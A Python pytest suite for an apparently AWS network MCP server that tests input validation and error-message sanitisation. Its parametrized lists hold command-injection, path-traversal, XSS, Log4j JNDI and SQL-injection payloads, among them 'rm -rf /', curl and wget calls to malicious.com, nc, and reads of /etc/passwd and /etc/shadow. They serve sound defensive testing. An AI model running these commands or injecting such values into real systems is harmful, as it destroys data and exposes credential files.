# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Security test cases for input validation across all tools."""

import pytest
from awslabs.aws_network_mcp_server.tools.cloud_wan.get_cloudwan_details import (
    get_cloudwan_details,
)
from awslabs.aws_network_mcp_server.tools.general.find_ip_address import find_ip_address
from awslabs.aws_network_mcp_server.tools.vpc.get_vpc_network_details import (
    get_vpc_network_details,
)
from fastmcp.exceptions import ToolError
from unittest.mock import MagicMock, patch


class TestSecurityInputValidation:
    """Security-focused test cases for input validation."""

    @pytest.mark.parametrize(
        'malicious_input',
        [
            'vpc-12345678; rm -rf /',  # Command injection attempt
            'vpc-12345678`whoami`',  # Command substitution
            'vpc-$(echo test)',  # Command substitution
            'vpc-12345678 && curl malicious.com',  # Command chaining
            'vpc-12345678|nc -l 9999',  # Pipe injection
            '../../../etc/passwd',  # Path traversal
            '<script>alert("xss")</script>',  # XSS attempt
            '../../../../../../etc/shadow',  # Directory traversal
            '${jndi:ldap://malicious.com}',  # Log4j style injection
            '\x00/bin/sh',  # Null byte injection
            '\\x22 OR 1=1--',  # SQL injection attempt in resource ID
        ],
    )
    @patch('awslabs.aws_network_mcp_server.tools.vpc.get_vpc_network_details.get_aws_client')
    async def test_vpc_id_injection_prevention(self, mock_get_client, malicious_input):
        """Test that malicious VPC ID inputs are safely handled."""
        mock_ec2_client = MagicMock()
        mock_get_client.return_value = mock_ec2_client
        # Simulate AWS API rejecting invalid format
        mock_ec2_client.describe_vpcs.side_effect = Exception('InvalidVpc.NotFound')

        with pytest.raises(ToolError):
            await get_vpc_network_details(vpc_id=malicious_input, region='us-east-1')

        # Verify the malicious input was passed to AWS API (where it would be safely rejected)
        mock_ec2_client.describe_vpcs.assert_called_once_with(VpcIds=[malicious_input])

    @pytest.mark.parametrize(
        'malicious_ip',
        [
            '10.0.1.100; cat /etc/passwd',  # Command injection
            '10.0.1.100`id`',  # Command substitution
            '192.168.1.1 && wget malicious.com',  # Command chaining
            '../../../../../../etc/hosts',  # Path traversal
            '<script>fetch("http://evil.com")</script>',  # XSS
            '${env:HOME}',  # Environment variable injection
            '\x00\x01\x02invalid',  # Binary data injection
        ],
    )
    @patch('awslabs.aws_network_mcp_server.tools.general.find_ip_address.get_aws_client')
    async def test_ip_address_injection_prevention(self, mock_get_client, malicious_ip):
        """Test that malicious IP address inputs are safely handled."""
        mock_ec2_client = MagicMock()
        mock_get_client.return_value = mock_ec2_client
        mock_ec2_client.describe_network_interfaces.return_value = {'NetworkInterfaces': []}

        # Should handle gracefully - AWS API will reject invalid IP formats
        try:
            await find_ip_address(ip_address=malicious_ip, region='us-east-1', all_regions=False)
        except ToolError as e:
            # Expected - IP not found or invalid format
            assert 'not found' in str(e).lower() or 'error' in str(e).lower()

        # Verify the malicious input was safely passed to AWS (where it's validated)
        mock_ec2_client.describe_network_interfaces.assert_called()

    @pytest.mark.parametrize(
        'malicious_region',
        [
            'us-east-1; rm -rf /',  # Command injection
            'us-east-1`whoami`',  # Command substitution
            '../../../../../../etc/passwd',  # Path traversal
            '<script>alert(1)</script>',  # XSS
            '${IFS}cat${IFS}/etc/passwd',  # Bash variable injection
            '\x00us-east-1',  # Null byte injection
        ],
    )
    @patch('awslabs.aws_network_mcp_server.tools.general.find_ip_address.get_aws_client')
    async def test_region_injection_prevention(self, mock_get_client, malicious_region):
        """Test that malicious region inputs are safely handled."""
        mock_ec2_client = MagicMock()
        mock_get_client.return_value = mock_ec2_client
        # AWS client creation or API calls should fail with invalid region
        mock_get_client.side_effect = Exception('InvalidRegion')

        with pytest.raises(Exception):  # Could be ToolError or other exception
            await find_ip_address(
                ip_address='10.0.1.100', region=malicious_region, all_regions=False
            )

    @pytest.mark.parametrize(
        'malicious_profile',
        [
            'profile; cat /etc/passwd',  # Command injection
            'profile`id`',  # Command substitution
            '../../../../../../etc/shadow',  # Path traversal
            '<script>fetch("http://evil.com")</script>',  # XSS
            '${HOME}/malicious',  # Environment variable expansion
            '\x00malicious\x00',  # Null byte injection
        ],
    )
    @patch('awslabs.aws_network_mcp_server.tools.general.find_ip_address.get_aws_client')
    async def test_profile_name_injection_prevention(self, mock_get_client, malicious_profile):
        """Test that malicious profile name inputs are safely handled."""
        mock_ec2_client = MagicMock()
        mock_get_client.return_value = mock_ec2_client
        # Profile creation should fail safely
        mock_get_client.side_effect = Exception('ProfileNotFound')

        with pytest.raises(Exception):
            await find_ip_address(
                ip_address='10.0.1.100',
                region='us-east-1',
                all_regions=False,
                profile_name=malicious_profile,
            )

    @pytest.mark.parametrize(
        'malicious_core_network_id',
        [
            'core-network-12345; rm -rf /',
            'core-network-12345`whoami`',
            '../../../malicious/path',
            '<iframe src="javascript:alert(1)">',
            '${jndi:rmi://malicious.com/evil}',
        ],
    )
    @patch('awslabs.aws_network_mcp_server.tools.cloud_wan.get_cloudwan_details.get_aws_client')
    async def test_core_network_id_injection_prevention(
        self, mock_get_client, malicious_core_network_id
    ):
        """Test that malicious core network ID inputs are safely handled."""
        mock_nm_client = MagicMock()
        mock_get_client.return_value = mock_nm_client
        mock_nm_client.get_core_network.side_effect = Exception('CoreNetworkNotFound')

        with pytest.raises(ToolError):
            await get_cloudwan_details(
                core_network_id=malicious_core_network_id, core_network_region='us-east-1'
            )

        # Verify malicious input was passed to AWS API where it's safely rejected
        mock_nm_client.get_core_network.assert_called_once_with(
            CoreNetworkId=malicious_core_network_id
        )

    @pytest.mark.parametrize(
        'oversized_input',
        [
            'x' * 1000,  # Very long string
            'a' * 10000,  # Extremely long string
            '\n' * 500,  # Many newlines
            'vpc-' + 'a' * 500,  # Long resource ID
        ],
    )
    @patch('awslabs.aws_network_mcp_server.tools.vpc.get_vpc_network_details.get_aws_client')
    async def test_oversized_input_handling(self, mock_get_client, oversized_input):
        """Test handling of oversized inputs."""
        mock_ec2_client = MagicMock()
        mock_get_client.return_value = mock_ec2_client
        mock_ec2_client.describe_vpcs.side_effect = Exception('ValidationError')

        with pytest.raises(ToolError):
            await get_vpc_network_details(vpc_id=oversized_input, region='us-east-1')

    def test_none_input_handling(self):
        """Test handling of None inputs for required parameters."""
        with pytest.raises(TypeError):
            find_ip_address(ip_address=None, region='us-east-1', all_regions=False)

    def test_empty_string_input_handling(self):
        """Test handling of empty string inputs."""
        # This should be caught by pydantic validation
        with pytest.raises(Exception):  # Could be ValidationError or similar
            find_ip_address(ip_address='', region='us-east-1', all_regions=False)

    @patch('awslabs.aws_network_mcp_server.tools.general.find_ip_address.get_aws_client')
    async def test_aws_credentials_not_leaked_in_errors(self, mock_get_client):
        """Test that AWS credentials are not leaked in error messages."""
        mock_get_client.side_effect = Exception('NoCredentialsError: Unable to locate credentials')

        with pytest.raises(ToolError) as exc_info:
            await find_ip_address(ip_address='10.0.1.100', region='us-east-1', all_regions=False)

        error_msg = str(exc_info.value).lower()

        # Ensure no sensitive data appears in error messages
        sensitive_patterns = [
            'aws_access_key',
            'aws_secret',
            'password',
            'token',
            'credential',
            'akia',
            'key_id',
            'secret_key',
        ]

        for pattern in sensitive_patterns:
            assert pattern not in error_msg, (
                f'Potentially sensitive data found in error: {pattern}'
            )

    @patch('awslabs.aws_network_mcp_server.tools.general.find_ip_address.get_aws_client')
    async def test_error_message_sanitization(self, mock_get_client):
        """Test that error messages are properly sanitized."""
        mock_ec2_client = MagicMock()
        mock_get_client.return_value = mock_ec2_client
        # Simulate error with potentially sensitive info
        mock_ec2_client.describe_network_interfaces.side_effect = Exception(
            'AccessDenied: User arn:aws:iam::123456789012:user/testuser is not authorized to perform ec2:DescribeNetworkInterfaces'
        )

        with pytest.raises(ToolError) as exc_info:
            await find_ip_address(ip_address='10.0.1.100', region='us-east-1', all_regions=False)

        # Error should be passed through (AWS already sanitizes ARNs appropriately)
        # But we verify the structure remains informative for debugging
        assert 'Error searching IP address:' in str(exc_info.value)
        assert 'REQUIRED TO REMEDIATE BEFORE CONTINUING' in str(exc_info.value)
